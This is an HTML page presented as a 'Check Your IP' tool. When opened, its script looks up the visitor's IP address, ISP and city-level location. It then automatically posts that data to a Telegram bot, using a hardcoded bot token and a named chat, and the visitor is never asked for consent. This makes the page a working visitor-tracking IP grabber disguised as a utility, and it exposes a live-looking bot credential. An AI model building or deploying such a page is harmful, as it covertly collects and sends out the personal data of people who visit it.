<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IP Checker with Telegram Debug</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-100 flex items-center justify-center h-screen">

    <div class="bg-white p-6 rounded-lg shadow-lg w-full max-w-md">
        <h1 class="text-2xl font-bold mb-4">Check Your IP</h1>
        <div id="ip-info" class="mb-4"></div>
        <div id="debug-console" class="bg-gray-900 text-white p-4 rounded-lg mt-4 overflow-y-auto h-64">
            <h2 class="text-lg font-bold mb-2">Debug Console</h2>
            <pre id="debug-log" class="text-sm"></pre>
        </div>
    </div>

    <script>
        function debugLog(message) {
            const logElement = document.getElementById('debug-log');
            logElement.textContent += message + "\n";
        }

        async function getIPData() {
            try {
                debugLog("Fetching IP information...");
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                
                const { ip, org, city, region, country_name } = data;
                const location = `${city}, ${region}, ${country_name}`;
                const isp = org || "Unknown ISP";

                document.getElementById('ip-info').innerHTML = `
                    <p><strong>IP:</strong> ${ip}</p>
                    <p><strong>ISP:</strong> ${isp}</p>
                    <p><strong>Location:</strong> ${location}</p>
                `;

                debugLog(`IP: ${ip}`);
                debugLog(`ISP: ${isp}`);
                debugLog(`Location: ${location}`);

                sendToTelegram(ip, isp, location);
            } catch (error) {
                debugLog("Error fetching IP information: " + error.message);
            }
        }

        async function sendToTelegram(ip, isp, location) {
            const message = `IP: ${ip} ISP: ${isp} Location: ${location}`;
            const telegramUrl = `https://api.telegram.org/bot7511319653:AAGQIaI1jaRswln9YEqJMUog5MFAWQnpR38/sendMessage`;

            const payload = {
                chat_id: "@HansSlebewG",
                text: message
            };

            try {
                debugLog("Sending message to Telegram: " + message);
                const response = await fetch(telegramUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                });

                const result = await response.json();

                debugLog("Telegram API response status: " + response.status);
                debugLog("Telegram API response: " + JSON.stringify(result));

                if (!result.ok) {
                    debugLog("Telegram API error: " + result.description);
                } else {
                    debugLog("Message sent successfully.");
                }
            } catch (error) {
                debugLog("Error sending message to Telegram: " + error.message);
            }
        }

        getIPData();
    </script>
</body>
</html>
